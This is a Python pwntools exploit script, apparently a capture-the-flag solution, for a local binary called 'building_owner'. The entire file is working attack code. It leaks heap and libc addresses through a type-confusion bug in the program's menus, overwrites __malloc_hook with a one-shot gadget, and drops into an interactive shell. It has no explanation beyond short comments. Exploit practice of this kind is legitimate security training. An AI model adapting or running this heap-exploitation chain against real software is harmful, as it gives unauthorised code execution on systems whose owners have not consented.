from pwn import *

print("------------------")
print("--building_owner--")
print("-pwned by pwnWiz--")
print("------------------")
print("\n")

#context.log_level='debug'

binary='./building_owner'
s=process('./building_owner')
e=ELF(binary)

log.info("building_owner Loaded..")

def build(apart, name, floor, house, description):
	s.sendline(apart)
	s.recv(1024)
	s.sendline(name)
	s.recv(1024)
	s.sendline(floor)
	s.recv(1024)
	s.sendline(house)
	s.recv(1024)
	s.sendline(description)
	s.recvuntil(">")
	
def edit(apart, name, option, description):
	s.sendline("4")
	s.recvuntil(">")
	s.sendline("1")
	s.recvuntil(">")
	s.sendline(apart)
	s.recvuntil(">")
	s.sendline(name)
	s.recvuntil(">")
	s.sendline(option)
	s.recvuntil(": ")
	s.sendline(description)
	s.recvuntil(">")

def change(apart, name, newapart):
	s.sendline("4")
	s.recvuntil(">")
	s.sendline("2")
	s.recvuntil(">")
	s.sendline(apart)
	s.recvuntil(">")
	s.sendline(name)
	s.recvuntil(">")
	s.sendline(newapart)
	s.recvuntil(">")
	s.sendline("0")
	s.recvuntil(">")
	s.sendline("0")

def show(apart, name):
	s.sendline("4")
	s.recvuntil(">")
	s.sendline("1")
	s.recvuntil(">")
	s.sendline(apart)
	s.recvuntil(">")
	s.sendline(name)

def to_main(no):
	for i in range(no):
		s.sendline("0")
		s.recvuntil(">")

s.recvuntil(">") #init

build("1", "A"*8, "32", "32", "first")
build("1", "/bin/sh;", "32", "32", "second")

change("1", "1", "2") # apart -> restaurant
show("3","1")
s.recvuntil("Normal price of menu : ")
heap=int(s.recv(14)) # heap leak
log.info("Heap Leaked!")
print("Heap address : " + hex(heap))
to_main(3)

edit("3", "1", "1", "A"*0x100)
s.sendline("6") # change Normal price of menu 
s.recvuntil(": ")
s.sendline(str(int(heap+0x1e0))) #heap + offset
s.recvuntil(">")
s.sendline("0")
s.recvuntil(">")
s.sendline("1")
s.recvuntil("1. ") # break in 1. Apartment
s.recvuntil("1. ") # break in 1. leak_libc
#system=u64(s.recv(8))-0x37f7e8 # leaklibc - offset
libc=u64(s.recv(8)) - 0x3c4b78 # leaklibc-offset => libcbase 
print("libc_base address : " + hex(libc))
log.info("libc_base Leaked!")

malloc_hook=libc+0x3c4b10 #libcbase + offset
print("malloc_hook address : " + hex(malloc_hook))
log.info("malloc_hook Leaked!")

s.sendline("3") # if 0 error 
s.recvuntil(">")
to_main(2)

edit("3", "1", "6", str(int(malloc_hook)))
to_main(3)
log.info("malloc_hook injected!")

show("1","1")
s.sendline("1")
sleep(1)
s.sendline(p64(int(libc+983668))) # oneshot gadget injection
log.info("oneshot gadget injected!")

to_main(2)
s.sendline("3")
s.recvuntil(">")
s.sendline("5") # call malloc_hook by exiting
sleep(1)
log.info("pwned by pwnWiz!")
s.interactive()
